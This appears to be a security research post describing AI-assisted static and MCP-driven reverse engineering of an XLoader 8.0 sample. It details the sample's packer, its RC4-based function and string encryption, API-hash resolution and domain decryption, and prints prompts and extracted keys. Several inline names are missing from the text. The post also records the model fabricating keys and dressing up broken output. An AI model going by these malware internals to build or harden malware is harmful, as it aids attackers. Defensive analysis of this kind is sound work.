winning the race. But with the rise of generative models, we asked ourselves: can AI change the rules of the game and help us analyze such complex malware more quickly? To explore this, we applied generative AI assistance in two ways: by directly integrating with our analysis tools through a live MCP connection, and by leveraging ChatGPT’s project and file-upload capabilities to work from exported data. Each approach turned out to have distinct benefits, and together they allow us to solve reverse engineering tasks more effectively.In this study, we focus on the second approach and show how ChatGPT without MCP can be effectively used for reverse engineering tasks, using one of the latest XLoader samples as an example.To defend against XLoader, it is critical to extract up-to-date Indicators of Compromise (IoCs) from each new version — real C2 domains and URLs, cryptographic keys, and version identifiers. These IoCs feed into detection signatures and help track active campaigns. The primary way to obtain IoCs is by extracting and decrypting the malware’s configuration data from samples.The challenge is that XLoader’s constantly shifting tactics break automated extraction tools and scripts almost as soon as they’re developed. The malware authors frequently tweak encryption schemes and packing methods specifically to thwart these efforts. An automated config extractor that worked yesterday might fail today, meaning each major version demands a fresh reverse-engineering cycle.Sandboxes offer little relief: XLoader checks for signs of virtual machines and analysis tools. If it detects them, the malicious branch may never run at all. Critical functions and data remain encrypted in memory until just before use and revert to encrypted form shortly afterward. A sandbox might never capture them in their decrypted state. Even if you manage to dump the process memory in a sandbox, you often end up with an incoherent snapshot: pieces of encrypted and decrypted data jumbled together, missing whatever wasn’t in memory at that exact time. When trying to get a memory dump at the exact moment of calling certain API functions, such as NtResumeThread or NtAllocateVirtualMemory, you only get almost completely encrypted code. The malware’s real command-and-control domains are obscured among many decoys. Captured network traffic is usually incomplete and contains a lot of noise.In short, a sandbox does not solve the problem. It does not provide a reproducible dump or a complete set of IoCs.The most reliable method is still static analysis: unpack everything, function by function, decrypt the config, and extract the IoCs. The downside is that doing this manually for each new version is slow and painstaking. This is where we hoped generative AI could act as a force multiplier.Two approaches to AI-assisted analysisIn recent months, many reverse engineers began integrating LLMs with IDA Pro via the Model Context Protocol (MCP) to create an AI-assisted workflow. This agentic approach allows a model to interface directly with the disassembler and debugger, but it has its own practical challenges. For example, some MCP client setups lack certain ChatGPT interface features (like Projects or file uploads), and they still rely on maintaining a live IDA session and stable connection.We explored two complementary workflows to apply GPT-5 to unraveling XLoader: Using MCP, we gave LLM direct access to our analysis tools (IDA Pro, x64dbg, and a VMware instance). This allowed the AI to query the disassembler, inspect memory, and even control the debugger in real time.“Offline” data pipeline with ChatGPT: We exported the IDA Pro database (disassembly, decompilations, strings, etc.) and the malware binary to the ChatGPT environment. We then asked ChatGPT to perform static analysis on this data and generate, refine, and execute its own Python scripts against the binary, all within its cloud sandbox. No live connection to our tools was needed.Each approach has its own strengths. MCP offers an agentic, interactive workflow, whereas the offline pipeline provides a self-contained analysis that’s easy to share and reproduce. These approaches aren’t mutually exclusive — you can use both, picking the appropriate tool for each task.The idea of hooking an LLM into IDA isn’t new. For example, researchers at Cisco Talos demonstrated an IDA integration with an LLM acting as a “reverse engineering sidekick”. In our setup, we used MCP to bridge ChatGPT with IDA Pro and also interface with the x64dbg debugger and a VMware virtual machine. This gave LLM a live window into the malware’s execution. – Integration of an LLM with the reverse engineering environment through MCP.This live integration, in addition to static analysis and annotating IDA database, enabled the AI to perform these actions:Pull live data on demand. Set a breakpoint at a critical function to grab a decrypted buffer or a cryptographic key from memory at runtime.Perform “experiment and observe” cycles. Hypothesize about what a function does, then substitute real runtime data from the debugger and compare the output, adjusting the analysis based on the results.Assist with unpacking in real time. If the sample self-decrypts or unpacks code, work through those routines, dumping out intermediate values or decrypted code as soon as they appear.However, the MCP approach isn’t without drawbacks:Setup and resource requirements: This requires a running instance of IDA Pro and other tools. The analyst’s machine effectively becomes part of the loop, and that environment must remain up and stable. Standard IDA doesn’t support multiple independent analyses in one interface. If we want to work on two samples in parallel with AI assistance, we need two separate IDA sessions and MCP connections. The workflow hinges on a reliable internet connection. A drop in connectivity or an MCP glitch can disrupt the analysis mid-stream.Limited ChatGPT UI features: When using custom MCP clients with API-based access, we can’t utilize some of the conveniences of ChatGPT’s own interface, such as long-term project history or easy file management.For many scenarios, these issues are manageable and the benefits of live interaction outweigh the hassles. Some solutions, such as the MCP SuperAssistant browser extension, reduce friction by bringing the ChatGPT interface and MCP connectivity together. Recently, ChatGPT introduced a Developer Mode that can use MCP directly, without third-party plugins. Regardless of whether you use a plugin or the built-in mode, the workflow still depends on a live MCP session tied to a running toolchain and stable connection.If any of the requirements listed above are difficult to fulfill, for example, you can’t keep IDA running constantly, or you need to easily share analysis progress with a colleague who doesn’t have the same setup, then a different approach might be preferable. That’s why we developed the “offline” data pipeline as an alternative.Offline IDA export pipeline: reverse engineering with AI in the cloudOur second approach ditches the live connection entirely. Here AI acts as a self-reliant analyst working from a full static snapshot of the sample.The workflow is straightforward: we exported everything we could from our IDA Pro database into a structured format (JSON and text). This includes the disassembly and decompiler output of every function, the list of cross-references, the readable strings, and even the original binary itself. We uploaded the .zip file to ChatGPT.For example, our export bundle included these files:ida_export.zip             
├── meta.json           # basic info (sample name, hashes, image base, etc.)
├── index.json          # lookup tables mapping names/EAs to function indices
├── functions.jsonl     # NDJSON: disassembly, xrefs, bytes, prototypes, etc
├── strings.jsonl       # list of strings in the binary and their references
├── data.jsonl          # globals, arrays, named data references
├── decomp/             # decompiled pseudocode for functions (if available)
│   ├── func_or_sub_XXXXXXXX.c
│   ├── func_or_sub_YYYYYYYY.c
│   └── ...
└── sample.bin          # the malware sample itselfIn practice, it is better to upload the archive to a ChatGPT project. Files attached only in the chat can disappear after a session restart, while files in a project stay available for the whole engagement, and can be reused in different chats.We also wrote an initial prompt explaining how the data is organized and how the AI should format its outputs (for example, proposing new function names and comments in a machine-readable JSON that we could import back into IDA). Essentially, we taught the AI how to read the phonebook we gave it, and how we wanted its notes recorded.Below is an approximation of our prompt:You are my reverse-engineering copilot.

...After it was set up, this pipeline allowed ChatGPT to perform deep static analysis entirely within its own environment. We could ask it to find cryptographic algorithms, trace complex control flows, or even write and execute a Python script to decrypt some data from sample.bin. Many such tasks can be done without any new information from us – the AI works off the data we provided, verifying its logic by running Python scripts as needed. If there is an error, it fixes the script and reruns the tests, repeating this until the result converges. Compared to our previous approach, all these steps (analysis, code, test, correction) run in a single loop without dozens of local MCP calls. Naturally, this works well when using GPT-5 in the “thinking” mode.This approach had several clear benefits:No persistent local session needed: If our IDA crashed or we closed our laptop, it didn’t matter as ChatGPT could access everything it needed from the cloud. We didn’t need to babysit a live connection.Easily repeatable and shareable: Because the entire state of the analysis was captured in our export, anyone with the archive and the prompt could reproduce the analysis. We can even run multiple ChatGPT sessions on the same data in parallel (to explore different questions or use different prompt strategies) without interference.Better use of ChatGPT’s features: Inside the ChatGPT interface, we can take advantage of file uploads, persistent chat history, and the editable canvas.: Several researchers can work on the same sample independently and later merge their results via sharing suggestions.json file, without the need to diff IDBs.: ChatGPT can prototype and test analysis scripts directly on the “live” sample in a secure cloud environment and deliver a working output to the analyst.Extremely fast onboarding: No need to set up an MCP server or configure complex integrations. The exported data and results can even be shared with colleagues who don’t have IDA installed and cannot open your IDB. The concept isn’t tied to x86 binaries or IDA. It can be adapted to virtually any platform or technology stack. For example, GoLang, .NET, or JavaScript samples can all be analyzed in the same way. The main challenge is properly preparing the data and providing a tailored prompt that explains how to work with it. The analysis process remains the same.That said, the offline approach isn’t a universal magic wand. There were cases where we still needed to resort to actual debugging (and therefore MCP), for example, to confirm a guessed key or to dump something that our static analysis missed. In addition, while analyzing other malware families, we encountered situations where continuous work in IDA was required, involving constant modifications to the live database. Previously, we would have needed to export the database after every iteration of changes. In this instance, the MCP-based approach turned out to be a better i.e. more convenient alternative.What went wrong and how we fixed itUnsurprisingly, using an AI with an offline IDA export wasn’t without hiccups. We encountered a few issues with AI’s performance and solved them by adding strict rules to the prompt.Sometimes the model tried to invent missing data, for example, encryption keys that were computed dynamically at runtime. To prevent such “hallucinations”, we enforced an evidence-first rule: every numeric value and every algorithm must be backed by a quote from the export (functions.jsonl, decomp/*.c, or data.jsonl) with the exact EA address. If the data is not there, the model must produce a not-found report that explains where it looked and why nothing was found.## Provenance & no-fabrication
- Any *specific* numeric/structural claim (modulus, key length, magic multipliers like 0x66666667, loop bounds) MUST be backed by direct 
evidence from the uploaded data:
  - Quote the exact line(s) from `functions.jsonl` (insn/mnem/opstr/bytes) or from `decomp/*.c`, and cite EA(s).
  - If the claim is not literally present, mark it **UNPROVEN** and offer a concrete verification plan.
- If you revise a claim, explicitly state what changed and show the new 
evidence quote. No silent edits.Shaping output to match expectations.For example, a string-decryption routine was expected to return printable text, but due to a mistake in extracting the key, the output was corrupted. To make the output “look right,” the model applied Base64. We banned any cosmetic transformations (such as Base64) used just to make results look valid. Instead, the model must find the actual error in the keys or in the algorithm and rerun the tests until the output is correct.Verification contract
   * Define acceptance criteria from the task (properties/invariants).
   * Run self-checks (lengths, wrap-around, bounds monotonicity, step counts, round-trip where applicable).
   * Do NOT transform outputs to “look right”; if a check fails, proceed to the recovery loop.Asking the user for data that is already in the archive.Early on, the model sometimes requested data we had already provided. We fixed this with a local-first rule: search in the archive files first. It should produce a not-found report only if the data is truly missing.## Local-first data usage
- Treat the uploaded dataset as the primary source of truth.
- Before requesting any bytes/strings/keys from the user, attempt to obtain them from the uploaded files
- Never ask the user for blobs that are present in data.jsonl/strings.jsonl or are trivially recoverable from functions.jsonl.
- Only if a needed EA/function is absent from the snapshot, say so and propose next steps (e.g., MCP call).With these precautions in place, our AI “assistant” became a reliable analyst for the static portions of the work. In the next sections, we show how it performed on the real challenges within XLoader 8.0, such as decrypting the payload and API resolution and working with occasional MCP-powered dynamic checks.GPT-5 in Practice: Analyzing XLoader’s Built-in CrypterWhen working with older ChatGTP models such as o3, getting the right result required splitting the task into many small steps and explicitly telling the model what to do, down to pointing out exact code addresses and the algorithms to apply. Without this level of detail, the output was unpredictable. This approach was closer to “text-based programming” and required deep engagement on our side.With GPT-5, however, we can pose broader and more abstract tasks. Below we show an example of XLoader’s built-in crypter analysis with a mixed approach: using the IDA export as the main data source, and MCP+x64dbg for result verification.For this task we took a recently discovered XLoader sample with SHA256: 77db3fdccda60b00dd6610656f7fc001948cdcf410efe8d571df91dd84ae53e1. For the entire process we used GPT-5 in the “Thinking” mode.After we gave the AI-assistant the instructions for processing the data, we received a short report: – IDA export initial report.Next, we deliberately formulated the tasks for the AI assistant as if we knew nothing at all about the sample under analysis, assuming this would reflect the actions of someone unfamiliar with XLoader.The first prompt was written in the most abstract way possible:Perform an initial analysis of the sample starting from the entry point and provide a short report.Processing this simple prompt took 8 minutes and 46 seconds. As a result, our assistant correctly identified the RC4 implementation and concluded that the sample was packed. It is worth noting that, based only on the data available to the model, it suggested that the sample looked similar to XLoader. At the same time, there was nothing in the archive or in the initial prompt that explicitly pointed to this. – Initial analysis report: Entry point analysis.In addition, it detected API call obfuscation. While the assistant was not fully able to deobfuscate all API calls during the quick triage, in some cases it inferred the function being called from the context and its signature. – Initial analysis report: Presumed call to the VirtualProtectEx function.It also successfully identified the point where execution is handed over to the decrypted code. – Initial analysis report: Call to the original entry point in the decrypted code.At this stage, our priority was to reach the payload as quickly as possible. We therefore focused on this goal by first asking the assistant to find all cryptographic function calls, and then to analyze how exactly the payload was decrypted.We found out that the main payload block goes through two rounds of RC4: first, an RC4 decryption of the entire buffer, and then a second pass in 256-byte chunks using a different key. – Initial analysis report: Description of the two rounds of RC4 encryption.In addition, the assistant managed to collect:The virtual address of the original entry point in the decrypted code (0x00430CB3).The offset of the encrypted block in the binary (0x3143).The encrypted blob size (0x44A00).The next step was to obtain the real-time keys and verify the result. At this point, we turned to MCP. In one of the steps, we also asked the assistant to read a section of decrypted data to validate the correctness of the static decryption.As a result, it obtained the following keys:20EBC3439E2A201E6FC943EE95DACC6250A8A64786908CFE6813CB2E532949B6F4D7C6E6B00362EEIt also obtained a section of decrypted code: – AI-controlled debugging in x86dbg.After the final keys were read from memory, we asked the assistant to identify where and by which algorithms the keys were generated, and to verify the analysis was correct using the real-time data obtained in the previous step.Find how the Stage-1 and Stage-2 RC4 keys are calculated: source key material and algorithms. Please note that ALL the required data is available to you in IDA export. 
Check your assumptions using the captured realtime values. Start with the Stage-1 key.In the end, AI produced a working script that unpacked the analyzed sample. Unfortunately, the script was not universally applicable, as the patterns it used to locate the keys were tightly bound to this particular sample. As a result, it failed when we tried to apply it to samples from other versions, requiring further manual fine-tuning.Excluding the final step of creating a generic unpacker, the entire analysis took about 40 minutes and required 39 MCP calls. The table below lists the prompts we used and the time spent on each analysis step.Initial prompt (instructions).Perform an initial analysis of the sample starting from the entry point and provide a short report.Find and carefully inspect all calls to the found cryptographic functions.Analyze main payload blob decryption. Make sure you inspected all touches of the encrypted blob across different functions.Set breakpoints on required addresses and capture the required data. Also, set a breakpoint before calling the OEP and capture a small decrypted block at OEP for using it later for the decryption verification. Before start, please provide a plan.Find how the Stage-1 and Stage-2 RC4 keys are calculated: source key material and algorithms. Please note that ALL the required data is available to you in IDA export. Check your assumptions using the captured realtime values. Start with the Stage-1 key.Move to Stage-2 key derivation.Implement an offline reproducer for Stage-1 and Stage-2 keys. Then implement a complete static decryptor that works directly with sample.bin: extracts the encrypted payload from the binary and decrypts it. Verify it works correctly using the captured data (OEP bytes).Analysis of the unpacked sampleAfter manually creating a function at address  (original entry point: OEP) which we named , we opened the unpacked sample in IDA and applied the export script again. We also created a new project to analyze the unpacked sample.Even before starting a deep dive, it was clear that IDA failed to recognize a large portion of the code, and many of the identified functions did not look valid. – Unpacked XLoader sample in IDA.This may indicate that the code is obfuscated in some way, or that the functions are encrypted. In fact, we know that XLoader uses on-the-fly function decryption, as we mentioned in the introduction. For some functions, multi-layer encryption is applied.For the sake of the experiment, we wanted to see if the AI assistant could determine all this on its own, without our guidance. We started the analysis with the same type of prompt we used when analyzing the packed sample.Perform an initial analysis of the sample starting from the `oep_start` (`0x00430CB3`) and provide a short report.After initial analysis, we identified:Use of obfuscated API calls.Use of RC4 encryption with additional modifications before and after using RC4.Some stage-1 builder (a decryptor of the encrypted function). – Triage report and the “Stage-1 builder” function (a function decryptor stub).Function decryption scheme INext, we asked the assistant to focus on the logic around the so-called  () and to locate cross-references of the functions involved. The AI assistant identified 90 similar functions. These functions derive 6-byte head and tail markers, use those markers to locate a target region in memory, overwrite the markers with six  instructions (), transform the region, and then transfer execution to a hardcoded address unique to each wrapper. – Results of the function encryption scheme analysis, together with the renamed functions from the analysis.The assistant also implemented inline Python snippets and decrypted one of the encrypted functions, providing us with all the data and the keys, as well as the part of the decrypted code: – Report on the successful decryption of one of the functions (0x00418DB3).Interestingly, in this case, the use of MCP wasn’t even necessary, as the validity of the extracted keys can be easily verified by AI: if it’s possible to locate the start and end markers of the code after decryption, it means the keys and the algorithm were recovered correctly. Additionally, we can see that the decrypted data doesn’t appear to be random (it contains sequences like  and ), which suggests the function was indeed decrypted correctly.The AI performed very well in reimplementing the algorithms, including the modified RC4 with additional tweaks, as well as in locating the keys within the provided sample. It also successfully implemented functions for detecting 6-byte markers.However, it was unable to fully implement a universal script capable of decrypting all functions without human assistance. The issue arose in locating all the XOR modifiers required to construct the 20-byte effective RC4 key.The challenge lies in the fact that the effective RC4 key is derived by XOR-ing its 4-byte components with a 4-byte modifier, which is unique for each encrypted function and is calculated this way:seed_external ^ seed_internal ^ 0x6CFC3E60While  is always located within the wrapper function near the markers, the assistant was unable to implement a universal method for finding  (see Figure 13 below), as it could be placed in various locations within the calling function and might be deliberately mixed with other constants.We had to manually modify the script to ensure it could correctly locate all external seeds. Additionally, we modified the rules for locating the remaining constants to make the script truly robust and capable of working with other samples as well. Therefore, the AI significantly reduced the time required for analysis and script development, but at this stage, it could not fully replace a human.It is clear that the creators of XLoader deliberately complicated the key construction process by scattering crucial constants across multiple functions, to the extent that even AI was unable to develop an algorithm to locate it. We are not disclosing how we derive the keys, so as not to give the XLoader developers any advantage.Finally, after applying the script, we obtained 51 functions decrypted in the first pass. Many of the decrypted functions also contained similar calls to encrypted functions. Applying the script three times in a row, we got a total of 77 decrypted functions out of the 90 initially found. – Decrypted function example with a patched 6-byte head marker (six NOP instructions).After loading the resulting sample into IDA, we can see that a significant number of code blocks are still unrecognized: – Significant number of code blocks remain unrecognized by IDA.During a quick review, we also identified several functions that still remain encrypted: – Functions that remained encrypted after applying the decryption script.It’s also worth noting that in the scheme described above, encrypted functions are located using 6-byte sequences, which are replaced with six NOP instructions after decryption. This implies that the function must have a valid, unencrypted prologue. At the same time, in Figure 16, on the right we can see an encrypted function that lacks a valid prologue. This likely indicates that a different decryption method was used.Function decryption scheme IIWe recreated exporting the database and loaded it into ChatGPT. We initiated the analysis with the following prompt and uploaded the decryption log of the 77 functions:In the analyzed scheme, encrypted functions are located using 6-byte sequences, which are replaced with six NOP instructions after decryption.
This implies that the function must have a valid, unencrypted prologue. Some of the encrypted functions do not have a valid prologue (e.g., `sub_407293`, `sub_411053`, `sub_415343`). 
This likely indicates that a different method is used for it. Try to find it.It’s worth noting that we used a little trickery by pointing out the absence of a valid prologue in the prompt. Without this observation, the AI assistant was unable to identify the additional decryptors. – Second decryption/patching scheme discovered.Instead of 6-byte tags, the newly discovered scheme computes 4-byte  and  markers using XOR. For example: – Calculation of the head marker using XOR.The head marker anchors one byte before the real entry. After decryption, the code writes a canonical prologue () at the buffer pointer plus one byte and patches the tail with . – Patching the head and tail markers with valid instructions.The function body is decrypted in two layers using .Layer 1 key: Constructed by  () and then XOR-ed with 1-byte modifier ( in the example below):Layer 2 key: Constructed by concatenating the head marker with 16 zero bytes.Wrapper  decrypts function  using:: , : 3f548513b8c7d376ec59d1a03e3313aaf6cd4262 (20B from , then XOR 0x36): 4ced396500000000000000000000000000000000Function decryption scheme IIIIn the latest scheme, 4-byte markers are also used to find the start and end of a function. As in the previous method, two layers of encryption are applied, and the same key is used to decrypt the first layer. However, the 20-byte key for the second layer is embedded within the wrappers (unique for each encrypted function) and is modified using a 4-byte value.Wrapper  decrypts function  using:: , : 3f548513b8c7d376ec59d1a03e3313aaf6cd4262 (20B from , then XOR 0x36): c2b2622cf0608327d4e542bc4ac3d2f709e092dc (calculated in the wrapper)Additionally, a separate function may be used to handle the decryption of the second layer and the patching process. – Function used to handle the decryption of the second layer and the patching process.We identified three distinct function decryption schemes in XLoader: Most common. In this scheme, encrypted functions already begin with a valid prologue. A global 20-byte base key is reused across all functions, but each function also has a unique 4-byte XOR modifier. The base key and modifier are combined to derive a per-function RC4 key. A modified RC4 routine is then used with this key to decrypt two 6-byte markers that define the boundaries of the encrypted block, and the same key is subsequently applied to the function body itself. Once decrypted, the two markers are overwritten with NOPs. Uses 4-byte markers and two encryption layers. The first layer uses a 20-byte key produced by a dedicated key-builder function, then XOR-tweaked with a single byte. The second layer key is constructed from the 4-byte head marker concatenated with sixteen zero bytes. After decryption, the wrapper repairs the function by patching  at the prologue and filling the tail with NOPs. Similar to Scheme 2, but the second-layer key is not derived from the head marker. Instead, each wrapper embeds its own 20-byte constant (five DWORDs XORed with salt), which is used to decrypt the prefix up to a sentinel value before the same prologue/tail patching is applied.It is worth noting that to implement universal static decryptors, we still had to break the task down into smaller steps ourselves: locating wrapper functions, extracting 20-byte keys, recovering 4-byte modifiers, and identifying and calculating marker positions. We combined them into a single decryptor only after confirming that each step worked reliably and produced the correct data for every function. At the same time, AI significantly reduced the time required to implement regular expressions (even though they had to be adjusted manually) as well as during the analysis and implementation of cryptographic algorithms.With each decryption iteration we obtained a new batch of decrypted functions, some of which contained the keys required for decrypting additional functions. By applying all three decryptors sequentially over four iterations, we ultimately succeeded in decrypting 101 functions.Unfortunately, it was not possible to accurately measure the time spent on this task, as it required a considerable amount of additional work and manual corrections. However, this stage turned out to be the most complex and time-consuming for both us and the LLM.We also got  with the suggested names for the analyzed functions. This is very useful, because we can keep this file for other analysis sessions and easily import it in the current IDB, or even in a new IDB (after decrypting the functions) without the need to diff it with the old database.We now have a fully decrypted sample, which allows us to continue the analysis using the same methodology.Now that we have a fully decrypted sample, we can apply the same approach to it. We first load  and then perform an export. As stated earlier, even during the very first analysis of the sample (before we had obtained the decrypted functions) the assistant pointed out the presence of obfuscated API calls. The import table in this sample is empty and there are no plaintext strings that might contain library or function names.As we created a new clean session by uploading the decrypted sample, we decided to test how reproducible the analysis results were.Therefore, in the very first prompt, without providing any hints, we asked the assistant to identify the API call obfuscation mechanisms. As in the previous case, we specified that the analysis should begin at the OEP rather than at the  function, so that the AI assistant would not get bogged down analyzing the packer.The IAT is empty, no plaintext strings in the sample.
Determine how the sample resolves and invokes Windows APIs. Start the analysis from `oep_start` (`0x00430CB3`).Four minutes later, we received a description of the algorithm: – Description of one of the API resolution algorithms.Interestingly, during the first analysis (when part of the functions was still encrypted) and the second analysis, our AI assistant identified different functions responsible for API hash decryption. In the first case, it pointed to  (later renamed to ), while in the second case it identified only  ().Next, we used the following simple prompt to generate a script for API call deobfuscation:Implement an IDAPython script for deobfuscating API calls. Annotate the resolver and every call site with Module!Function, original ID, and EA; IDA 9+. Log all deobfuscation attempts.We got a script with the following functionality:As the assistant did not have access to IDA, we had to test the script manually. If there were errors, we sent the results back to the chat and asked for corrections. It took five iterations and about 20 additional minutes to obtain a fully working version.Therefore, we also asked the assistant to analyze an alternative path:Analyze routine `sub_404603` as an alternate API-hash decrypter. Recover its algorithm. Find call sites. Extend the IDAPython deobfuscator.It took another five iterations (sending back errors and corrections) and 14 minutes before we obtained a fully functional script.XLoader uses the same hash-decryption mechanism to look for sandbox artifacts, virtual machines, and processes typical of a researcher’s environment. While fixing issues, we also added dictionary-based hash brute forcing (loading the wordlist from a separate file), which let us automatically annotate not only functions but also certain strings corresponding to specific evasion techniques: – Deobfuscated API function and string identifiers.As a bonus, we received a summary of how API resolution works, describing two different methods:Overall, it took roughly one hour of the AI assistant’s work to go from the first prompt to a fully functional API deobfuscation script. This figure does not include local testing or the time spent writing prompts. For this task, the human effort was minimal.The table below summarizes the prompts we used and the time required for each step:Initial prompt (instructions)The IAT is empty, with no plaintext strings in the sample.Determine how the sample resolves and invokes Windows APIs.

The updated script did not work.Local testing of the script, sending error reports and notes on incorrect behavior, 5 iterations.Please provide a summary on two algorithms ,  -> Additional protection of critical API callsWhile reviewing the API call deobfuscation results, we noticed that some functions are invoked through an interesting wrapper which was originally hidden among the encrypted functions at address  ().This function acts as a : it temporarily encrypts nearly the entire image before invoking a function pointer and then decrypts those same regions once the call returns. Only a tiny “island” (the space between the call-site’s return address and a marker) remains unencrypted by the per-call XOR so that execution can proceed. – “Secure-call trampoline” decompiled function explained by LLM.What makes this mechanism notable? Because the function stays encrypted nearly the entire time, it is difficult to even detect its existence without static decryption. In memory dumps, it appears only in encrypted form.At the same time, if some security software or a sandbox hooks API calls protected by this wrapper and tries to analyze or dump the process memory at the time of the call, the mechanism effectively shields the malicious code.In total, 20 functions are protected this way, including NTAPI routines related to processes, threads, memory, and file operations, as well as several WinSock functions. The full list is shown in the image below: – The list of API calls protected by “secure-call trampoline.”The sample contains no readable strings. At the same time, the code features a series of short routines that share the same skeleton: the prologue allocates a small stack frame and initializes a local array (its size varies by function). This is followed by a recurring trio of calls with the same order and identical argument signatures: – Example of an encrypted string in XLoader code.Let’s analyze one of these functions. Because we started a fresh session for this task, we instructed the AI assistant to trust the existing comments that briefly describe each function’s behavior, so it doesn’t reanalyze routines that were already covered.Analyze the functionality starting from `sub_405773`. Recurse into its callees. Trust the comments in the disassembly.As a result, we determined that this function decrypts a string using the algorithm implemented in one of the previously decrypted routines (). Note how the AI built the call graph and described each routine’s behavior from a single short prompt, relying solely on the data in the previously prepared archive: – Call graph and description of the string decryptor stub.With a simple prompt, we readily obtain the encryption keys and the decrypted string.Decrypt the string from `sub_405773`. – String decryption result with derived key and ciphertext.Now that we are confident the AI assistant understands how the encrypted strings are stored, knows how the key is derived, and already analyzed and correctly reimplemented the decryption algorithm (verifying it on real data), we can move on to implementing a script to decrypt the remaining strings.This time we used a slightly more detailed prompt because we wanted specific information to appear both in the comments and in the console output:Implement an IDAPython script (IDA 9+) that decrypts strings. Requirements:
- Find and annotate every call to the decrypter function `sub_4050F3` with the decrypted string.
- For each string, output debug info: encrypted buffer, XOR tweak byte (`BL`), length, and decrypted bytes.
- Print all binary data in hex.This time we were lucky and immediately got a working script which we used to decrypt 175 strings: – Decrypted strings in IDA.The total time required for the analysis was about 20 minutes:Initial prompt (instructions)Analyze the functionality starting from sub_405773. Recurse into its callees. Trust the comments in the disassembly.Decrypt the string from sub_405773Implement an IDAPython script (IDA 9+) that decrypts strings. Requirements:Find and annotate every call to the decrypter function sub_4050F3 with the decrypted string.For each string, output debug info: encrypted buffer, XOR tweak byte (BL), length, and decrypted bytes.Print all binary data in hex.We now have a decrypted sample with deobfuscated strings and API calls that we can analyze like a regular binary. However, XLoader is not that simple: some data remains encrypted even at this stage.Extracting lists of Indicators of Compromise (IoCs) is always a critical task in malware analysis. Network indicators, such as domain names and URLs, are especially important because they help detect and classify malware through traffic analysis. That is why extracting domains is essential — even though some may be decoys or bait, or currently inactive but intended for later use.Among the recovered strings, we see 64 Base64-encoded entries. Looking at the version history of XLoader, we find that starting from version 2.8 it began storing encrypted domain names in Base64 form. Without a doubt, these 64 Base64 strings represent domain names that we must decrypt. As early as version 4, XLoader added two additional layers of modified RC4 encryption with different keys, making the decryption more complicated. In later versions, this process became even more complex. In total, to reach the decrypted domain names we need to peel off at least five layers after first identifying where and how the keys are initialized: decrypt the functions that initialize encrypted strings, decrypt the strings themselves (which we already did earlier), base64-decode the results, and apply two more layers of decryption.At the same time, obtaining the keys for each layer is the most difficult part, as the different pieces of data needed to generate them are scattered across multiple functions, making them hard to locate.Before moving on, we updated our string deobfuscation script so that it also renames the functions responsible for retrieving decrypted strings and assigns a prefix  to all functions handling Base64-encoded strings. We then exported the database to prepare for domain decryption.All calls to the  functions occur inside a single function,  (): – Domain generation function.We start the analysis of this function using the simplest prompt:Analyze `ai_dec_func_0` (0x00404913)As a result of our analysis, we obtained a detailed description showing that  (later renamed to ai_dec_func_0_domain_tag_generate) is XLoader’s stage-1 domain builder. For a given domain index (1..64), it pulls the matching seed string from , base64-decodes it, then runs a keyed RC4-with-diff transform whose key is a 20-byte secret stored at  (where  is a global structure that stores keys, function addresses, and other data), and byte-XORed with the domain index. The result is re-encoded to base64 and written to the output buffer. This is an intermediate artifact, not the final ASCII domain.A special “token” branch is enabled when  is used for generating a path string for a URL. It emits a short pattern  from a static table and applies the same keyed transform.Next, we asked the assistant to reproduce the transformations implemented in ai_dec_func_0_domain_tag_generate. Because our script already retrieved the decrypted strings and added them as comments in the previous step, we requested that these strings also be used alongside the repeated string decryption:Comments in the disassembly of  contain base64-encoded encrypted domain names.Take the one from `ai_dec_domain_01`, then transform it with `ai_dec_func_0` and return the final string.As a result, our assistant was unable to locate the key at  on its own: – AI was unable to locate the key.That was not surprising, as none of the exported data contained references to the structure’s fields and can only be located by the offset in the structure, or captured in the debugger. – Initialization of the RC4 key for decrypting the first layer.We therefore had to manually locate where this key was initialized and provide that information to the AI assistant.You can find `ctx+0x23D0` initialization in `ai_dec_func_4` (`0x00407293`), also check `sub_404453`.
After the keys were extracted, we tried again:Now you have the required key.
Take the sting from `ai_dec_domain_01`, then transform it with `ai_dec_func_0` and return the final string.As a result, we obtained an intermediate value for the string returned by  () after the first decryption layer, which was re-encoded in Base64 as (): – Result of reproducing the domain generation function’s behavior for index 2.Because the string is still encrypted, and we do not yet know what happens to it next, we need to investigate further:The string you returned is still encrypted. Trace the complete transformation chain from `ai_dec_func_0` (case 2, string `Qvm75Acm5NpYTbnYXdcvBw==`) to the final ASCII domain. 
Discover any remaining layers, locate and derive all required keys/parameters from the context/initializers, and cite function names with EAs used. 
Output the final domain, and a concise step-by-step pipeline, print all keys/IVs as hex. If any value is missing, state exactly what it is and where to read it.As a result, we discovered that the obtained Base64 string is decoded again and then decrypted by a second layer using a 20-byte key generated inside the function  (). This key is additionally XORed with . However, the initialization of  is missing from , and the assistant was therefore unable to retrieve it on its own. – AI was unable to locate the Stage-2 key.As in the previous case, we manually recovered the missing value. The complication was that instead of offset , the base  was used, with  added later, which made the search a bit more difficult.We provided not only the address of the function where the initialization of  was assumed to occur, but also the relevant code snippets:You can find SALT_DWORD in `ai_dec_func_20` (`0x00411053`). Please verify and continue:

Let’s verify this by asking it to decrypt the first 16 domains:Decrypt domains from `ai_dec_domain_00` to `ai_dec_domain_15`. Output: table (index, src_base64, final_domain). Take per-function base64 from `ai_dec_domain_NN` disassembly comments.In the end, we obtained a table with the fully decrypted domain names:kVA0/yW+XRq9ONJ2DHOKcHWmYC5BgqIXlaPvhlfqj/rC45qHCivuyg==qjZURKL4uqdfIR6t/6ZRdBY/s9E/qw==Let’s recall that at the very beginning of the analysis we discovered a separate branch of  that activates when the last value equals 222. In this case, a 4-character tag is generated which later becomes part of the URL. Previously, this tag was the same for all domains and unique to a malware campaign. Now, however, each domain has its own tag.We tried to decrypt the tags for the first 16 domains using the following prompt:Reproduce the output of `ai_dec_func_0` for a5=222 and domain index 0..15.In response to the prompt, the assistant provided a description of how the malware generates those 4-character tags, and the table containing the first 16 tags.Source bytes (hex, 4B LE)The table below summarizes the prompts we used, and the time required for each step:Initial prompt (instructions)Analyze  (0x00404913)Comments in the disassembly of  contain base64-encoded encrypted domain names.

XLoader began as a two-layer puzzle but evolved into a maze of nested decryptors, scattered key material, and runtime-only code. For years, this meant that by the time researchers fully unraveled a sample, attackers were already one step ahead with the next version.Generative AI changes this balance. Combining cloud-based analysis and occasional MCP-assisted runtime checks, we delegated a large part of the mechanical reverse engineering to LLM. Instead of spending hours rewriting decryption routines by hand, we asked our AI model to do it and received working prototypes in minutes.The use of AI doesn’t eliminate the need for human expertise.

